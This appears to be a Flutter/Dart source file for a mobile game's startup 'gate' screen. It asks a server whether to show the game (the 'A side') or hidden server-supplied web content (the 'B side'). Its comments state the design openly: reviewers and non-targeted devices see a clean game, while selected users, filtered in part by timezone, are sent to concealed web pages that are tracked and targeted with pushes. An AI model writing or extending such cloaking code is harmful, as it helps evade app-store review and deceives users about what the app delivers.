import 'package:flutter/material.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:url_launcher/url_launcher.dart';

import '../core/constants/app_strings.dart';
import '../core/theme/app_theme.dart';
import '../push/push_service.dart';
import '../screens/splash_screen.dart';
import '../tracking/tracking_service.dart';
import 'gate_service.dart';
import 'web_screen.dart';

/// 启动闸：App 的真正入口。启动即请求服务端 AB 面判定，据结果决定进 A 面（游戏本体）
/// 还是 B 面（服务端下发的 web）。判定完成前显示与 SplashScreen 同款的渐变加载页，避免白屏、
/// 并与随后的 Splash 动画视觉连续。
///
/// 安全默认：判定进行中、失败、或结果非 B，一律进 A 面 —— 即游戏原有的
/// `SplashScreen`（→ `HomeScreen`）流程，游戏侧代码零改动。
class GateScreen extends StatefulWidget {
  const GateScreen({super.key});

  @override
  State<GateScreen> createState() => _GateScreenState();
}

enum _Phase { deciding, aSide, bSide }

class _GateScreenState extends State<GateScreen> {
  _Phase _phase = _Phase.deciding;
  String? _bUrl;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    // 归因初始化不阻塞判定：A/B 都要初始化，失败也不影响启动。
    unawaitedInit();

    final tz = await _localTimezone();
    var result = await const GateService().evaluate(timezone: tz);
    result = const GateResult.bSide('https://example.com'); // TEMP-B-VERIFY

    // 带本次判定结果注册推送 token（后端据 gateMode 只推 B 面设备）。不阻塞 UI。
    // ignore: discarded_futures
    PushService.instance.registerWithGateMode(result.isBSide ? 'B' : 'A');

    if (!mounted) return;
    if (result.isBSide) {
      // 进 B 面前补发 AF 标准事件（内部已容错）。内开/外开都算进入 B 面。
      await TrackingService.instance.onEnterBSide();
      if (!mounted) return;
      if (result.isExternal) {
        // 外开：唤起系统浏览器打开 B 面，App 本体展示 A 面（游戏）——既送用户去 B 面，
        // 又让 App 看起来仍是干净游戏。浏览器打不开时静默降级，仍停在 A 面。
        final opened = await _openExternal(result.url!);
        // 确实唤起浏览器成功才补发 OpenBLanding（AF + Adjust）；失败不发。
        if (opened) await TrackingService.instance.onOpenBLanding();
        if (!mounted) return;
        setState(() => _phase = _Phase.aSide);
      } else {
        // 内开：App 内嵌全屏 WebView 打开 B 面（默认，与渠道壳 App 一致）。
        setState(() {
          _bUrl = result.url;
          _phase = _Phase.bSide;
        });
      }
    } else {
      setState(() => _phase = _Phase.aSide);
    }
  }

  /// 用系统外部浏览器打开 url，返回是否唤起成功。失败（无浏览器、地址非法等）一律吞掉、返回 false：
  /// 此时 App 停在 A 面，属于可接受的降级（不影响审核安全，该设备已判 B）。
  Future<bool> _openExternal(String url) async {
    try {
      final uri = Uri.tryParse(url);
      if (uri == null) return false;
      return await launchUrl(uri, mode: LaunchMode.externalApplication);
    } catch (_) {
      // 落到 A 面。
      return false;
    }
  }

  /// 触发归因 SDK 初始化，不等待其完成。
  void unawaitedInit() {
    // ignore: discarded_futures
    TrackingService.instance.init();
  }

  /// 取本机 IANA 时区名（如 Asia/Manila）。失败返回空串——时区是服务端的可选收紧条件，
  /// 空串时若服务端未配时区白名单不受影响；配了则该设备判 A（安全侧）。
  Future<String> _localTimezone() async {
    try {
      return await FlutterTimezone.getLocalTimezone();
    } catch (_) {
      return '';
    }
  }

  @override
  Widget build(BuildContext context) {
    // 对齐 decktallypro setRoot 的 0.25s cross dissolve：判定完成切 A/B 面时淡入，不生硬跳变。
    return AnimatedSwitcher(
      duration: const Duration(milliseconds: 250),
      child: _current(),
    );
  }

  Widget _current() {
    switch (_phase) {
      case _Phase.aSide:
        return const SplashScreen();
      case _Phase.bSide:
        return WebScreen(url: _bUrl!);
      case _Phase.deciding:
        return const _LoadingScreen();
    }
  }
}

/// 判定期加载页。沿用 SplashScreen 的深色渐变与标题排布，判定结束切到真正的 Splash 时
/// 背景不跳变，冷启动观感与原版一致。
class _LoadingScreen extends StatelessWidget {
  const _LoadingScreen();

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: DecoratedBox(
        decoration: BoxDecoration(gradient: AppTheme.backgroundGradient),
        child: Center(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              SizedBox(
                width: 40,
                height: 40,
                child: CircularProgressIndicator(color: AppTheme.accent),
              ),
              SizedBox(height: 28),
              Text(
                AppStrings.appName,
                style: TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                  color: AppTheme.textPrimary,
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
